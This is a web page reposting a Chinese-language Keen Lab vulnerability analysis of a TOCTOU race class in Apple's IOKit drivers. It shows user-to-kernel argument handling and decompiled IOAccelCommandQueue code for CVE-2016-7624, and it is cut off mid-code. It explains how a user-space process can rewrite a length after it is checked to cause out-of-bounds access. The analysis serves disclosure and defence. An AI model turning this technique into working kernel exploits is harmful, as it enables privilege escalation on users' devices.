<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>Racing for everyone: descriptor describes TOCTOU in Apple&#39;s core</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">Racing for everyone: descriptor describes TOCTOU in Apple&#39;s core</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-01-09" class="timeago">8 月，1 周 之前</time>
          <time datetime="2017-01-09" class="fulldate">一月 09, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>作者：<a href="https://blog.flanker017.me/racing-for-everyone-descriptor-describes-toctou-in-apple-core-cn/">Flanker@
腾讯科恩实验室</a></p>
<p>来源：<a href="http://keenlab.tencent.com/zh/2017/01/09/Racing-for-everyone-descriptor-describes-TOCTOU-in-Apple-s-core/">
腾讯科恩实验室</a>，
<a href="http://drops.wiki/index.php/2017/01/09/osx/">drops.wiki</a></p>
<p>这篇文章是关于我们在苹果内核IOKit驱动中找到的一类新攻击面。之前写了个IDA脚本做了个简单扫描，发现了至少四个驱动都存在这类问题并报告给了苹果，苹果分配了3个CVE(CVE-2016-7620/4/5), 见 <a href="https://support.apple.com/kb/HT207423。">https://support.apple.com/kb/HT207423。</a> 后来我和苹果的安全工程师聊天，他们告诉我他们根据这个pattern修复了十多个漏洞，包括iOS内核中多个可以利用的漏洞。</p>
<p>为了能更清楚地描述这类新漏洞，我们先来复习下IOKit的基础知识。</p>
<h2><a href="#IOKit-revisited" title="IOKit revisited"></a>IOKit revisited</h2>
<p>在用户态, IOConnectCallMethod函数实现如下：</p>
<div class="codehilite"><pre><span></span><span class="mi">1709</span> <span class="n">kern_return_t</span>
<span class="mi">1710</span> <span class="nf">IOConnectCallMethod</span><span class="p">(</span>
<span class="mi">1711</span>    <span class="n">mach_port_t</span>  <span class="n">connection</span><span class="p">,</span>        <span class="c1">// In</span>
<span class="mi">1712</span>    <span class="kt">uint32_t</span>     <span class="n">selector</span><span class="p">,</span>      <span class="c1">// In</span>
<span class="mi">1713</span>    <span class="k">const</span> <span class="kt">uint64_t</span>  <span class="o">*</span><span class="n">input</span><span class="p">,</span>         <span class="c1">// In</span>
<span class="mi">1714</span>    <span class="kt">uint32_t</span>     <span class="n">inputCnt</span><span class="p">,</span>      <span class="c1">// In</span>
<span class="mi">1715</span>    <span class="k">const</span> <span class="kt">void</span>  <span class="o">*</span><span class="n">inputStruct</span><span class="p">,</span>       <span class="c1">// In</span>
<span class="mi">1716</span>    <span class="kt">size_t</span>       <span class="n">inputStructCnt</span><span class="p">,</span>    <span class="c1">// In</span>
<span class="mi">1717</span>    <span class="kt">uint64_t</span>    <span class="o">*</span><span class="n">output</span><span class="p">,</span>        <span class="c1">// Out</span>
<span class="mi">1718</span>    <span class="kt">uint32_t</span>    <span class="o">*</span><span class="n">outputCnt</span><span class="p">,</span>     <span class="c1">// In/Out</span>
<span class="mi">1719</span>    <span class="kt">void</span>        <span class="o">*</span><span class="n">outputStruct</span><span class="p">,</span>      <span class="c1">// Out</span>
<span class="mi">1720</span>    <span class="kt">size_t</span>      <span class="o">*</span><span class="n">outputStructCntP</span><span class="p">)</span>  <span class="c1">// In/Out</span>

<span class="mi">1721</span> <span class="p">{</span>
<span class="c1">//...</span>
<span class="mi">1736</span>     <span class="k">if</span> <span class="p">(</span><span class="n">inputStructCnt</span> <span class="o">&lt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">io_struct_inband_t</span><span class="p">))</span> <span class="p">{</span>
<span class="mi">1737</span>    <span class="n">inb_input</span>      <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">inputStruct</span><span class="p">;</span>
<span class="mi">1738</span>    <span class="n">inb_input_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_type_number_t</span><span class="p">)</span> <span class="n">inputStructCnt</span><span class="p">;</span>
<span class="mi">1739</span>     <span class="p">}</span>
<span class="mi">1740</span>     <span class="k">else</span> <span class="p">{</span>
<span class="mi">1741</span>    <span class="n">ool_input</span>      <span class="o">=</span> <span class="n">reinterpret_cast_mach_vm_address_t</span><span class="p">(</span><span class="n">inputStruct</span><span class="p">);</span>
<span class="mi">1742</span>    <span class="n">ool_input_size</span> <span class="o">=</span> <span class="n">inputStructCnt</span><span class="p">;</span>
<span class="mi">1743</span>     <span class="p">}</span>
<span class="mi">1744</span> <span class="c1">//...</span>
<span class="mi">1770</span>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">io_struct_inband_t</span><span class="p">))</span> <span class="p">{</span>
<span class="mi">1771</span>        <span class="n">inb_output</span>      <span class="o">=</span> <span class="n">outputStruct</span><span class="p">;</span>
<span class="mi">1772</span>        <span class="n">inb_output_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_msg_type_number_t</span><span class="p">)</span> <span class="n">size</span><span class="p">;</span>
<span class="mi">1773</span>    <span class="p">}</span>
<span class="mi">1774</span>    <span class="k">else</span> <span class="p">{</span>
<span class="mi">1775</span>        <span class="n">ool_output</span>      <span class="o">=</span> <span class="n">reinterpret_cast_mach_vm_address_t</span><span class="p">(</span><span class="n">outputStruct</span><span class="p">);</span>
<span class="mi">1776</span>        <span class="n">ool_output_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">mach_vm_size_t</span><span class="p">)</span>    <span class="n">size</span><span class="p">;</span>
<span class="mi">1777</span>    <span class="p">}</span>
<span class="mi">1778</span>     <span class="p">}</span>
<span class="mi">1779</span> 
<span class="mi">1780</span>     <span class="n">rtn</span> <span class="o">=</span> <span class="n">io_connect_method</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span>         <span class="n">selector</span><span class="p">,</span>
<span class="mi">1781</span>                <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">input</span><span class="p">,</span> <span class="n">inputCnt</span><span class="p">,</span>
<span class="mi">1782</span>                <span class="n">inb_input</span><span class="p">,</span>          <span class="n">inb_input_size</span><span class="p">,</span>
<span class="mi">1783</span>                <span class="n">ool_input</span><span class="p">,</span>          <span class="n">ool_input_size</span><span class="p">,</span>
<span class="mi">1784</span>                <span class="n">inb_output</span><span class="p">,</span>         <span class="o">&amp;</span><span class="n">inb_output_size</span><span class="p">,</span>
<span class="mi">1785</span>                <span class="n">output</span><span class="p">,</span>             <span class="n">outputCnt</span><span class="p">,</span>
<span class="mi">1786</span>                <span class="n">ool_output</span><span class="p">,</span>         <span class="o">&amp;</span><span class="n">ool_output_size</span><span class="p">);</span>
<span class="mi">1787</span> 
<span class="c1">//...</span>
<span class="mi">1795</span>     <span class="k">return</span> <span class="n">rtn</span><span class="p">;</span>
<span class="mi">1796</span> <span class="p">}</span>
</pre></div>


<p>如果输入的inputstruct大于<code>sizeof(io_struct_inband_t)</code>, 那么传入的参数会被cast成<code>mach_vm_address_t</code>，在后面被特殊对待。</p>
<h2><a href="#这里能race不？不能？那里呢？" title="这里能race不？不能？那里呢？"></a>这里能race不？不能？那里呢？</h2>
<p>对于每一个有好奇心的人，我们都要问，这些平常被漏洞研究者们熟视无睹的参数里有没有那些能触发条件竞争漏洞？历史上人们通常都把注意力集中在一看名字就知道有可能有race condition漏洞的<code>IOConnectMapMemory</code>中，之前包括pangu和google-project-zero的ian beer都在这里有过非常深入的研究，也导致这个人们所熟知的攻击面漏洞已经非常少了。</p>
<p>那回过头再来看这些IOKit的参数，这些被人们忽视的地方，究竟会不会有race呢？ 我们还是需要深入了解下IOKit调用中参数是如何从用户态传递到内核态的？</p>
<p>在MIG trap定义和对应生成的代码中，不同的输入类型会得到不同的对待处理。</p>
<div class="codehilite"><pre><span></span><span class="mi">601</span>
<span class="mi">602</span><span class="n">routine</span> <span class="n">io_connect_method</span><span class="p">(</span>
<span class="mi">603</span>     <span class="nl">connection</span>      <span class="p">:</span> <span class="n">io_connect_t</span><span class="p">;</span>
<span class="mi">604</span> <span class="n">in</span>  <span class="nl">selector</span>        <span class="p">:</span> <span class="kt">uint32_t</span><span class="p">;</span>
<span class="mi">605</span>
<span class="mi">606</span> <span class="n">in</span>  <span class="nl">scalar_input</span>    <span class="p">:</span> <span class="n">io_scalar_inband64_t</span><span class="p">;</span>
<span class="mi">607</span> <span class="n">in</span>  <span class="nl">inband_input</span>    <span class="p">:</span> <span class="n">io_struct_inband_t</span><span class="p">;</span>
<span class="mi">608</span> <span class="n">in</span>  <span class="nl">ool_input</span>       <span class="p">:</span> <span class="n">mach_vm_address_t</span><span class="p">;</span>
<span class="mi">609</span> <span class="n">in</span>  <span class="nl">ool_input_size</span>  <span class="p">:</span> <span class="n">mach_vm_size_t</span><span class="p">;</span>
<span class="mi">610</span>
<span class="mi">611</span> <span class="n">out</span> <span class="nl">inband_output</span>   <span class="p">:</span> <span class="n">io_struct_inband_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">;</span>
<span class="mi">612</span> <span class="n">out</span> <span class="nl">scalar_output</span>   <span class="p">:</span> <span class="n">io_scalar_inband64_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">;</span>
<span class="mi">613</span> <span class="n">in</span>  <span class="nl">ool_output</span>      <span class="p">:</span> <span class="n">mach_vm_address_t</span><span class="p">;</span>
<span class="mi">614</span> <span class="n">inout</span> <span class="nl">ool_output_size</span>   <span class="p">:</span> <span class="n">mach_vm_size_t</span>
<span class="mi">615</span> <span class="p">);</span>
<span class="mi">616</span>
</pre></div>


<p>下面是自动生成的代码:</p>
<div class="codehilite"><pre><span></span><span class="cm">/* Routine io_connect_method */</span>
<span class="n">mig_external</span> <span class="n">kern_return_t</span> <span class="nf">io_connect_method</span>
<span class="p">(</span>
    <span class="n">mach_port_t</span> <span class="n">connection</span><span class="p">,</span>
    <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span>
    <span class="n">io_scalar_inband64_t</span> <span class="n">scalar_input</span><span class="p">,</span>
    <span class="n">mach_msg_type_number_t</span> <span class="n">scalar_inputCnt</span><span class="p">,</span>
    <span class="n">io_struct_inband_t</span> <span class="n">inband_input</span><span class="p">,</span>
    <span class="n">mach_msg_type_number_t</span> <span class="n">inband_inputCnt</span><span class="p">,</span>
    <span class="n">mach_vm_address_t</span> <span class="n">ool_input</span><span class="p">,</span>
    <span class="n">mach_vm_size_t</span> <span class="n">ool_input_size</span><span class="p">,</span>
    <span class="n">io_struct_inband_t</span> <span class="n">inband_output</span><span class="p">,</span>
    <span class="n">mach_msg_type_number_t</span> <span class="o">*</span><span class="n">inband_outputCnt</span><span class="p">,</span>
    <span class="n">io_scalar_inband64_t</span> <span class="n">scalar_output</span><span class="p">,</span>
    <span class="n">mach_msg_type_number_t</span> <span class="o">*</span><span class="n">scalar_outputCnt</span><span class="p">,</span>
    <span class="n">mach_vm_address_t</span> <span class="n">ool_output</span><span class="p">,</span>
    <span class="n">mach_vm_size_t</span> <span class="o">*</span><span class="n">ool_output_size</span>
<span class="p">)</span>
<span class="p">{</span>
<span class="c1">//...</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">InP</span><span class="o">-&gt;</span><span class="n">scalar_input</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">scalar_input</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">scalar_inputCnt</span><span class="p">);</span>
<span class="c1">//...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">inband_inputCnt</span> <span class="o">&gt;</span> <span class="mi">4096</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">{</span> <span class="k">return</span> <span class="n">MIG_ARRAY_TOO_LARGE</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">InP</span><span class="o">-&gt;</span><span class="n">inband_input</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">inband_input</span><span class="p">,</span> <span class="n">inband_inputCnt</span><span class="p">);</span>

<span class="c1">//...</span>

    <span class="n">InP</span><span class="o">-&gt;</span><span class="n">ool_input</span> <span class="o">=</span> <span class="n">ool_input</span><span class="p">;</span>

    <span class="n">InP</span><span class="o">-&gt;</span><span class="n">ool_input_size</span> <span class="o">=</span> <span class="n">ool_input_size</span><span class="p">;</span>
</pre></div>


<p>这段代码告诉我们，scala_input和大小小于4096的structinput是会被memcpy嵌入到传递入内核的machmsg中的，所以这里面似乎没有用户态再操作的空间。</p>
<p>但是，如果struct_input的大小大于4096，那么这里就有特殊对待了。它会被保留为mach_vm_address且不会被更改。</p>
<p>我们再继续追下去，看看这个mach_vm_address进入内核之后又会被如何处理</p>
<div class="codehilite"><pre><span></span><span class="mi">3701</span> <span class="n">kern_return_t</span> <span class="n">is_io_connect_method</span>
<span class="mi">3702</span> <span class="p">(</span>
<span class="mi">3703</span>    <span class="n">io_connect_t</span> <span class="n">connection</span><span class="p">,</span>
<span class="mi">3704</span>    <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span>
<span class="mi">3705</span>    <span class="n">io_scalar_inband64_t</span> <span class="n">scalar_input</span><span class="p">,</span>
<span class="mi">3706</span>    <span class="n">mach_msg_type_number_t</span> <span class="n">scalar_inputCnt</span><span class="p">,</span>
<span class="mi">3707</span>    <span class="n">io_struct_inband_t</span> <span class="n">inband_input</span><span class="p">,</span>
<span class="mi">3708</span>    <span class="n">mach_msg_type_number_t</span> <span class="n">inband_inputCnt</span><span class="p">,</span>
<span class="mi">3709</span>    <span class="n">mach_vm_address_t</span> <span class="n">ool_input</span><span class="p">,</span>
<span class="mi">3710</span>    <span class="n">mach_vm_size_t</span> <span class="n">ool_input_size</span><span class="p">,</span>
<span class="mi">3711</span>    <span class="n">io_struct_inband_t</span> <span class="n">inband_output</span><span class="p">,</span>
<span class="mi">3712</span>    <span class="n">mach_msg_type_number_t</span> <span class="o">*</span><span class="n">inband_outputCnt</span><span class="p">,</span>
<span class="mi">3713</span>    <span class="n">io_scalar_inband64_t</span> <span class="n">scalar_output</span><span class="p">,</span>
<span class="mi">3714</span>    <span class="n">mach_msg_type_number_t</span> <span class="o">*</span><span class="n">scalar_outputCnt</span><span class="p">,</span>
<span class="mi">3715</span>    <span class="n">mach_vm_address_t</span> <span class="n">ool_output</span><span class="p">,</span>
<span class="mi">3716</span>    <span class="n">mach_vm_size_t</span> <span class="o">*</span><span class="n">ool_output_size</span>
<span class="mi">3717</span> <span class="p">)</span>
<span class="mi">3718</span> <span class="p">{</span>
<span class="mi">3719</span>     <span class="n">CHECK</span><span class="p">(</span> <span class="n">IOUserClient</span><span class="p">,</span> <span class="n">connection</span><span class="p">,</span> <span class="n">client</span> <span class="p">);</span>
<span class="mi">3720</span> 
<span class="mi">3721</span>     <span class="n">IOExternalMethodArguments</span> <span class="n">args</span><span class="p">;</span>
<span class="mi">3722</span>     <span class="n">IOReturn</span> <span class="n">ret</span><span class="p">;</span>
<span class="mi">3723</span>     <span class="n">IOMemoryDescriptor</span> <span class="o">*</span> <span class="n">inputMD</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="mi">3724</span>     <span class="n">IOMemoryDescriptor</span> <span class="o">*</span> <span class="n">outputMD</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="mi">3725</span> 
<span class="c1">//...</span>
<span class="mi">3736</span>     <span class="n">args</span><span class="p">.</span><span class="n">scalarInput</span> <span class="o">=</span> <span class="n">scalar_input</span><span class="p">;</span>
<span class="mi">3737</span>     <span class="n">args</span><span class="p">.</span><span class="n">scalarInputCount</span> <span class="o">=</span> <span class="n">scalar_inputCnt</span><span class="p">;</span>
<span class="mi">3738</span>     <span class="n">args</span><span class="p">.</span><span class="n">structureInput</span> <span class="o">=</span> <span class="n">inband_input</span><span class="p">;</span>
<span class="mi">3739</span>     <span class="n">args</span><span class="p">.</span><span class="n">structureInputSize</span> <span class="o">=</span> <span class="n">inband_inputCnt</span><span class="p">;</span>
<span class="mi">3740</span> 
<span class="mi">3741</span>     <span class="nf">if</span> <span class="p">(</span><span class="n">ool_input</span><span class="p">)</span>
<span class="mi">3742</span>    <span class="n">inputMD</span> <span class="o">=</span> <span class="n">IOMemoryDescriptor</span><span class="o">::</span><span class="n">withAddressRange</span><span class="p">(</span><span class="n">ool_input</span><span class="p">,</span> <span class="n">ool_input_size</span><span class="p">,</span>
<span class="mi">3743</span>                            <span class="n">kIODirectionOut</span><span class="p">,</span> <span class="n">current_task</span><span class="p">());</span>
<span class="mi">3744</span> 
<span class="mi">3745</span>     <span class="n">args</span><span class="p">.</span><span class="n">structureInputDescriptor</span> <span class="o">=</span> <span class="n">inputMD</span><span class="p">;</span>
<span class="c1">//...</span>
<span class="mi">3753</span>     <span class="nf">if</span> <span class="p">(</span><span class="n">ool_output</span> <span class="o">&amp;&amp;</span> <span class="n">ool_output_size</span><span class="p">)</span>
<span class="mi">3754</span>     <span class="p">{</span>
<span class="mi">3755</span>    <span class="n">outputMD</span> <span class="o">=</span> <span class="n">IOMemoryDescriptor</span><span class="o">::</span><span class="n">withAddressRange</span><span class="p">(</span><span class="n">ool_output</span><span class="p">,</span> <span class="o">*</span><span class="n">ool_output_size</span><span class="p">,</span>
<span class="mi">3756</span>                            <span class="n">kIODirectionIn</span><span class="p">,</span> <span class="n">current_task</span><span class="p">());</span>
<span class="c1">//...</span>
<span class="mi">3774</span>     <span class="k">return</span> <span class="p">(</span><span class="n">ret</span><span class="p">);</span>
<span class="mi">3775</span> <span class="p">}</span>
</pre></div>


<p>在这里我们可以看出苹果和Linux内核在处理输入上的一些不同。在Linux内核中，用户态输入倾向于被copy_from_user到一个内核allocate的空间中。而苹果内核对于大于4096的用户输入，则倾向于用一个IOMemoryDescriptor对其作一个映射，然后在内核态访问。</p>
<p>既然有映射存在，那么我们就要动歪脑筋了。我们能不能在IOKit调用进行的同时去在用户态修改这个映射呢？之前并没有人研究过这个问题，也没有相关的漏洞公布，似乎大家都默认，在发起调用后，这是用户态不可写的。真的是这样么？</p>
<p>令人吃惊的是，测试表明，这居然是可写的！后来苹果的工程师告诉我们，他们在看到我的漏洞报告的时候，才发现之前连他们都没注意到这里居然还是用户态可写的。</p>
<p>这就意味着，对于一个IOKit调用，如果内核处理输入的IOService接受MemoryDescriptor的话（绝大多数都接受），那么发起调用的用户态进程可以在输入被内核处理的时候去修改掉传入的参数内容，没有锁，也没有只读保护。由于连苹果的工程师都没有注意这个问题，这意味着他们在编写内核驱动的时候基本没有对这部分数据做保护处理，这不就是条件竞争漏洞的天堂么！</p>
<p>我迅速回忆了一下之前逆向过的几个IOKit驱动，很快就有一个漏洞pattern出现。IOReportUserClient, IOCommandQueue, IOSurface在处理用户态传进来的inputStruct的时候，在里面取出了一个长度作为后续边界处理的条件，虽然开发者肯定都先校验了这个长度，但由于这个racecondition的存在，那么用户态还是可以改掉这个长度绕过检查，自然就触发了越界。其他的pattern还有更多，就是发挥想象力的时候了。我们先来分析下IOCommandQueue这个典型例子，也就是CVE-2016-7624.</p>
<h2><a href="#IOCommandQueue内核服务中存在沙箱进程可以调用的越界读写漏洞" title="IOCommandQueue内核服务中存在沙箱进程可以调用的越界读写漏洞"></a>IOCommandQueue内核服务中存在沙箱进程可以调用的越界读写漏洞</h2>
<p>在IOCommandQueue::submit_command_buffer这个函数中，存在如上所述的条件竞争漏洞。这个函数接受structureInput或者structureInputDescriptor，其中在特定的offset存储了一个长度，虽然长度在传入的时候被校验过， 但利用这个条件竞争，攻击者依然可以控制长度，造成后续的越界读写。</p>
<h3><a href="#漏洞分析" title="漏洞分析"></a>漏洞分析</h3>
<p>IOAccelCommandQueue::s_submit_command_buffers接受用户输入的IOExternalMethodArguments, 如果structureInputDescriptor存在，那么descriptor会被用来映射为memorymap并翻译为原始地址.</p>
<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="n">IOAccelCommandQueue</span><span class="o">::</span><span class="n">s_submit_command_buffers</span><span class="p">(</span><span class="n">IOAccelCommandQueue</span> <span class="o">*</span><span class="n">this</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">IOExternalMethodArguments</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// r12@1</span>
  <span class="n">IOAccelCommandQueue</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// r15@1</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">inputdatalen</span><span class="p">;</span> <span class="c1">// rsi@1</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ebx@1</span>
  <span class="n">IOMemoryDescriptor</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// rdi@3</span>
  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// r14@3</span>
  <span class="kr">__int64</span> <span class="n">inputdata</span><span class="p">;</span> <span class="c1">// rcx@5</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">inputdatalen</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">a3</span><span class="o">-&gt;</span><span class="n">structureInputSize</span><span class="p">;</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="o">-</span><span class="mi">536870206</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">inputdatalen</span> <span class="o">&gt;=</span> <span class="mi">8</span>
    <span class="o">&amp;&amp;</span> <span class="n">inputdatalen</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">3</span>
                         <span class="o">*</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)(</span><span class="mh">0x0AAAAAAAAAAAAAAABLL</span> <span class="o">*</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">__int128</span><span class="p">)(</span><span class="n">inputdatalen</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7FFFFFFFFFFFFFF8LL</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="p">(</span><span class="n">IOMemoryDescriptor</span> <span class="o">*</span><span class="p">)</span><span class="n">a3</span><span class="o">-&gt;</span><span class="n">structureInputDescriptor</span><span class="p">;</span>
    <span class="n">v8</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v8</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="o">-&gt;</span><span class="n">vtbl</span><span class="o">-&gt;</span><span class="n">__ZN18IOMemoryDescriptor3mapEj</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">);</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="o">-</span><span class="mi">536870200</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v8</span> <span class="p">)</span>
        <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
      <span class="n">inputdata</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kr">__int64</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v8</span> <span class="o">+</span> <span class="mi">280LL</span><span class="p">))(</span><span class="n">v8</span><span class="p">);</span>
      <span class="n">LODWORD</span><span class="p">(</span><span class="n">inputdatalen</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="o">-&gt;</span><span class="n">structureInputSize</span><span class="p">;</span>
    <span class="p">}</span>
</pre></div>


<p>我们可以看到在offset+4, 一个DWORD被用来作为length和((unsigned <strong>int64)(0x0AAAAAAAAAAAAAAABLL * (unsigned </strong>int128)(inputdatalen - 8) &gt;&gt; 64) &gt;&gt; 1) &amp; 0x7FFFFFFFFFFFFFF8LL)比较</p>
<p>随后这个length在submit_command_buffer中再次被使用.</p>
<div class="codehilite"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="p">)</span>
<span class="p">{</span>
